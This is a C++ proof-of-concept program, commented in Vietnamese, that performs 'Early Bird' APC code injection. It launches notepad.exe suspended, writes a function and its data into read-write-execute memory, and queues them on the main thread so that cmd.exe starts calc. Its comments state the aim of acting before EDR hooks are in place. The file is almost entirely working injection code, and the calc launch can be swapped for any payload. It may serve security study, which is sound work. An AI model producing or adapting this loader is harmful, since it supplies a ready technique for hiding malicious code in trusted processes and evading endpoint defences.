#include <windows.h>
#include <iostream>
#include <string>
#include <vector>

// 1. Định nghĩa cấu trúc dữ liệu con trỏ tuyệt đối để xử lý độc lập vị trí
typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// 2. Hàm gánh logic thực thi độc lập vị trí khi luồng chính thức thức dậy
DWORD WINAPI EarlyBirdApcPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        // Khai hỏa bằng địa chỉ tuyệt đối tuyệt đối, né sạch lỗi địa chỉ tương đối RIP
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật tự động định vị vị trí thư mục hệ thống thực tế (Zero Static Buffers)
std::wstring GetActiveSystemTarget(const std::wstring& exeName) {
    // Bước 1: Truyền con trỏ NULL để OS tự tính kích thước vùng nhớ cần thiết
    UINT requiredSize = GetSystemDirectoryW(NULL, 0);
    if (requiredSize == 0) return L"";

    // Bước 2: Cấp phát động mảng vừa vặn đến từng byte để hứng chuỗi
    std::vector<wchar_t> systemDirBuf(requiredSize);
    if (GetSystemDirectoryW(systemDirBuf.data(), requiredSize) == 0) return L"";

    std::wstring finalPath(systemDirBuf.data());
    finalPath += L"\\" + exeName; // Ghép toán học chuỗi tên tiến trình vỏ bọc
    return finalPath;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 12: EARLY BIRD CODE INJECTION" << std::endl;
    std::cout << "====================================================" << std::endl;

    // CHỦ ĐỘNG: Định vị động bản đồ thư mục hệ thống thực tế, không gán cứng
    std::wstring targetExeName = L"notepad.exe";
    std::wstring dynamicPath = GetActiveSystemTarget(targetExeName);

    if (dynamicPath.empty()) {
        std::cerr << "[-] Khong the chu dong xac dinh duong dan he thong!" << std::endl;
        return EXIT_FAILURE;
    }
    std::wcout << L"[+] Da chu dong dinh vi tien trinh vo boc: " << dynamicPath << std::endl;

    STARTUPINFOW si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(STARTUPINFOW);

    // ─── BƯỚC 1: KHỞI TẠO TIẾN TRÌNH VỎ BỌC Ở TRẠNG THÁI ĐÓNG BĂNG HOÀN TOÀN ───
    std::cout << "[*] Dang khoi tao tien trinh vo boc o trang thai dong bang (CREATE_SUSPENDED)..." << std::endl;
    BOOL success = CreateProcessW(
        NULL,
        const_cast<LPWSTR>(dynamicPath.c_str()), // Nạp chuỗi đường dẫn chủ động thích ứng
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED, // Giữ chặt luồng ngay vạch xuất phát trước khi EDR kịp chèn Hook
        NULL,
        NULL,
        &si,
        &pi
    );

    if (!success) {
        std::cerr << "[-] CreateProcessW failed. Error: " << GetLastError() << std::endl;
        std::cin.get();
        return EXIT_FAILURE;
    }
    std::cout << "[+] Tien trinh vo boc duoc tao thanh cong! PID: " << pi.dwProcessId << " | ThreadID: " << pi.dwThreadId << std::endl;

    // Áp dụng quy trình Cấp phát động Thích ứng vừa khít đến từng byte
    SIZE_T functionSize = 500;

    // ─── BƯỚC 2: CẤP PHÁT BỘ NHỚ TỪ XA MANG QUYỀN RWX ĐỂ CHỨA PAYLOAD ───
    LPVOID remoteCodeBuffer = VirtualAllocEx(pi.hProcess, NULL, functionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)VirtualAllocEx(pi.hProcess, NULL, sizeof(THREAD_DATA), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!remoteCodeBuffer || !pRemoteData) {
        std::cerr << "[-] VirtualAllocEx tu xa failed!" << std::endl;
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Vung nho Code RWX cua payload dat tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // ─── BƯỚC 3: KHỞI TẠO CON TRỎ TUYỆT ĐỐI VÀ ĐẨY SANG RAM NOTEPAD ───
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // Đẩy linh hồn mã máy và tham số tuyệt đối vào lòng Notepad từ xa
    WriteProcessMemory(pi.hProcess, remoteCodeBuffer, (LPCVOID)EarlyBirdApcPayload, functionSize, NULL);
    WriteProcessMemory(pi.hProcess, pRemoteData, &localData, sizeof(THREAD_DATA), NULL);
    std::cout << "[+] Anh xa logic ham va tham so vao xac rong hoan tat." << std::endl;

    // ─── BƯỚC 4: CHIẾN THUẬT CHIM NON - GÀI ĐỊA CHỈ VÀO HÀNG ĐỢI APC LUỒNG CHÍNH ───
    std::cout << "[*] Dang gai ham vao hang doi QueueUserAPC cua luong chinh..." << std::endl;
    DWORD apcStatus = QueueUserAPC((PAPCFUNC)remoteCodeBuffer, pi.hThread, (ULONG_PTR)pRemoteData);

    if (apcStatus == 0) {
        std::cerr << "[-] QueueUserAPC failed. Error: " << GetLastError() << std::endl;
        VirtualFreeEx(pi.hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, pRemoteData, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Gai hang doi APC Early Bird thanh cong!" << std::endl;

    // ─── BƯỚC 5: RÃ ĐÔNG LUỒNG CHÍNH ĐỂ TIẾN TRÌNH TỰ ĐỘNG KHAI HỎA ───
    std::cout << "[*] Kich hoat ra dong (ResumeThread). He dieu hanh thuc day tu dong loi APC thuc thi..." << std::endl;
    ResumeThread(pi.hThread);

    // Sử dụng cờ kết thúc đồng bộ, dọn dẹp phẳng sạch tài nguyên
    std::cout << "\n[+] Early Bird Injection Process Completed Successfully!" << std::endl;
    std::cout << "[*] Nhan phim Enter de dong cua so va don dep tai nguyen..." << std::endl;
    std::cin.get();

    // Thu hồi Handle hệ thống phẳng sạch chống rò rỉ tài nguyên
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return EXIT_SUCCESS;
}